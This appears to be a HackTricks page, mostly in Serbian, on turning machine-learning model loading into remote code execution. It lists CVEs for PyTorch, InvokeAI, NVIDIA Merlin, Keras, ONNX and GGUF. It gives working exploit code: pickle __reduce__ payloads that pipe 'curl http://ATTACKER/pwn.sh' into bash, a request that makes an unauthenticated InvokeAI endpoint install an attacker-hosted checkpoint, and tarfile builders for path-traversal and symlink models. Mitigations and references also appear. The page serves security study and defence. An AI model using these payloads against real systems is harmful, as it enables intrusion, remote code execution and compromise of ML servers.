# RCE modela

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela do RCE

Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ti modeli se mogu učitati na računare developera ili u produkcione sisteme radi korišćenja. Obično modeli ne bi trebalo da sadrže zlonamerni kod, ali postoje slučajevi gde model može biti iskorišćen za izvršavanje proizvoljnog koda na sistemu kao predviđena funkcionalnost ili zbog ranjivosti u biblioteci za učitavanje modela.

U vreme pisanja, ovo su primeri ovakvih ranjivosti:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Zlonamerni pickle u checkpoint fajlu modela dovodi do izvršenja koda (zaobilaženje `weights_only` zaštite)                                | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerni download modela uzrokuje izvršenje koda; Java deserialization RCE u management API                                    | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Nepouzdani checkpoint pokreće pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršenje koda u ML worker-u             | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML koristi `yaml.unsafe_load` (izvršenje koda) <br> Učitavanje modela sa **Lambda** slojem izvršava proizvoljan Python kod | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Proizveden `.tflite` model pokreće integer overflow → oštećenje heap-a (potencijalni RCE)                                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela preko `joblib.load` izvršava pickle sa `__reduce__` payload-om napadača                                                 | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *osporeno*                                                                              | `numpy.load` podrazumevano dozvoljava pickled object arrays – zlonamerni `.npy/.npz` izaziva izvršenje koda                               | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Putanja external-weights ONNX modela može izaći iz direktorijuma (čitanje proizvoljnih fajlova) <br> Zlonamerni ONNX model tar može prepisati proizvoljne fajlove (vodeći do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model sa custom operator-om zahteva učitavanje nativnog koda napadača; kompleksni model grafovi mogu zloupotrebiti logiku za izvršavanje nepredviđenih proračuna   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje model-load API-ja sa omogućenim `--model-control` dozvoljava relativni path traversal za pisanje fajlova (npr. prepisivanje `.bashrc` za RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Neispravan GGUF model fajl izaziva heap buffer overflow-e u parseru, omogućavajući izvršenje proizvoljnog koda na žrtvinom sistemu                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Zlonamerni HDF5 (`.h5`) model sa Lambda slojem i kodom i dalje se izvršava pri učitavanju (Keras safe_mode ne pokriva stari format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Mnogi ML alati (npr. pickle-based model formats, Python `pickle.load`) izvršiće proizvoljan kod ugrađen u model fajlove, osim ako nije mitigovano | |

Štaviše, postoje Python pickle-based modeli, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu koristiti za izvršenje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, bilo koji pickle-based model može biti posebno podložan ovakvim napadima, čak i ako nije naveden u tabeli iznad.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install` koji korisnicima omogućava da preuzmu i učitaju modele sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kada je isporučeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvršava **pickle deserialization**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može da ubaci zlonamerni objekat sa prilagođenom metodom `__reduce__` unutar checkpoint-a; metoda se izvršava **during deserialization**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranljivosti je dodeljen **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Prikaz eksploatacije

1. Kreirajte zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Postavite `payload.ckpt` na HTTP server kojim upravljate (npr. `http://ATTACKER/payload.ckpt`).
3. Pokrenite ranjiv endpoint (nije potrebna autentifikacija):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, poziva `torch.load()` → `os.system` gadget se pokreće i napadač dobija izvršenje koda u kontekstu InvokeAI procesa.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` dostupan napadaču  
•  Proces ima dozvole za izvršavanje shell commands

#### Mitigacije

* Ažurirajte na **InvokeAI ≥ 5.4.3** – patch postavlja `scan=True` po defaultu i vrši malware scanning pre deserializacije.  
* Prilikom učitavanja checkpoints programatski koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Primetite enforce allow-lists / signatures za izvore modela i pokrećite servis sa najmanjim privilegijama.

> ⚠️ Zapamtite da je **bilo koji** Python pickle-based format (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) inherentno nesiguran za deserializaciju iz nepouzdanih izvora.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

Transformers4Rec kompanije NVIDIA (deo Merlin) izložio je unsafe checkpoint loader koji direktno poziva `torch.load()` na putanjama koje korisnik obezbedi. Pošto `torch.load` oslanja se na Python `pickle`, checkpoint pod kontrolom napadača može izvršiti proizvoljan kod putem reducer-a tokom deserializacije.

Ranljiv put (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo vodi do RCE: U Python pickle, objekat može definisati reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Callable se izvršava tokom unpickling-a. Ako takav objekat postoji u checkpoint-u, on se izvršava pre nego što se koriste bilo kakve težine.

Minimalni primer zlonamernog checkpoint-a:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i blast radius:
- Trojanized checkpoints/models deljeni putem repos, buckets ili artifact registries
- Automatizovani resume/deploy pipelines koji automatski učitavaju checkpoints
- Izvršavanje se dešava unutar training/inference workers, često sa povišenim privilegijama (npr. root u containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) je zamenio direktni `torch.load()` ograničenim deserializerom sa listom dozvoljenih tipova implementiranim u `transformers4rec/utils/serialization.py`. Novi loader validira tipove/polja i sprečava pozivanje proizvoljnih funkcija tokom učitavanja.

Odbrambena uputstva specifična za PyTorch checkpoints:
- Ne unpickle-ujte nepouzdane podatke. Preferirajte non-executable formate kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX kad god je moguće.
- Ako morate koristiti PyTorch serialization, podesite `weights_only=True` (podržano u novijim PyTorch) ili koristite prilagođeni unpickler sa listom dozvoljenih tipova sličan Transformers4Rec patch-u.
- Osigurajte provenance/signatures modela i deserializaciju u sandboxu (seccomp/AppArmor; non-root user; ograničen FS i bez network egress).
- Nadgledajte neočekivane child procese iz ML servisa u vreme učitavanja checkpoint-a; pratite upotrebu `torch.load()`/`pickle`.

POC i reference ranjivih/patch verzija:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Primer – kreiranje malicioznog PyTorch modela

- Kreirajte model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD izlaže `resnet` endpoint koji deserializes user-controlled data. ZDI je potvrdio da remote attacker može prisiliti žrtvu da učita malicioznu page/file, natera je da pošalje crafted serialized blob na taj endpoint i pokrene deserialization kao `root`, što vodi do full compromise.

Tok exploita odražava tipičan pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Bilo koji gadget dostupan tokom deserialization (constructors, `__setstate__`, framework callbacks, itd.) može se iskoristiti na isti način, bez obzira da li je transport bio HTTP, WebSocket, ili datoteka ubačena u posmatrani direktorijum.


## Modeli za Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI frameworks zasnovana je na arhivama, obično `.zip`. Zbog toga je moguće zloupotrebiti ove formate za izvođenje path traversal napada, što omogućava čitanje proizvoljnih datoteka sa sistema na kojem se model učitava.

Na primer, sa sledećim kodom možete napraviti model koji će kreirati datoteku u direktorijumu `/tmp` kada se učita:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Или, са следећим кодом можете креирати модел који ће при учитавању направити symlink ка `/tmp` директоријуму:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Detaljna analiza: Keras .keras deserialization and gadget hunting

Za fokusiran vodič o .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, i post-fix gadget discovery inside the allowlist, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Izvori

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
